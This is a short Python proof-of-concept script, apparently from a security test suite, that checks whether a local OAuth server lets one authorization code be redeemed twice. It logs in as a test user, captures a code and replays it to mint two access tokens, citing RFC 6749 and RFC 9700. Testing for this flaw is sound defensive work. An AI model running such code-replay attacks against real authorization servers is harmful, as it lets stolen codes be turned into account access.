"""
attack4_code_replay.py
======================
Root cause: the token endpoint does not mark an authorization code as used,
so a single code can be exchanged repeatedly (RFC 6749 sec 4.1.2: codes MUST
be single-use; RFC 9700 reinforces single-use + revocation on reuse).

Scenario (confidential client `webapp`):
  1. A code is issued for alice.
  2. The code is redeemed once -> access token A.
  3. The SAME code is redeemed again -> access token B.

Both succeed. In a real attack, an authorization code captured from logs,
browser history, or a proxy can be replayed after the legitimate client has
already used it.

SUCCESS = two distinct access tokens minted from one code.
"""
import os, re, requests

AS = os.environ.get("AS", "http://localhost:5000")


def _redeem(code):
    return requests.post(f"{AS}/token", data={
        "grant_type": "authorization_code", "code": code,
        "client_id": "webapp", "client_secret": "webapp-secret-0xDEADBEEF",
        "redirect_uri": "http://localhost:5001/callback",
    }).json()


def attack():
    s = requests.Session()
    s.post(f"{AS}/login", data={"username": "alice", "password": "alicepw"},
           allow_redirects=False)
    r = s.get(f"{AS}/authorize", params={
        "response_type": "code", "client_id": "webapp",
        "redirect_uri": "http://localhost:5001/callback",
        "scope": "openid", "_consent": "yes",
    }, allow_redirects=False)
    code = re.search(r"code=([^&]+)", r.headers["Location"]).group(1)

    t1 = _redeem(code)
    t2 = _redeem(code)   # replay
    a, b = t1.get("access_token"), t2.get("access_token")
    if a and b and a != b:
        return True, f"code replayed: two tokens minted ({a[:10]}..., {b[:10]}...)"
    return False, f"replay rejected (good): first={t1}, second={t2}"


if __name__ == "__main__":
    ok, detail = attack()
    print(("[VULNERABLE] " if ok else "[BLOCKED] ") + detail)
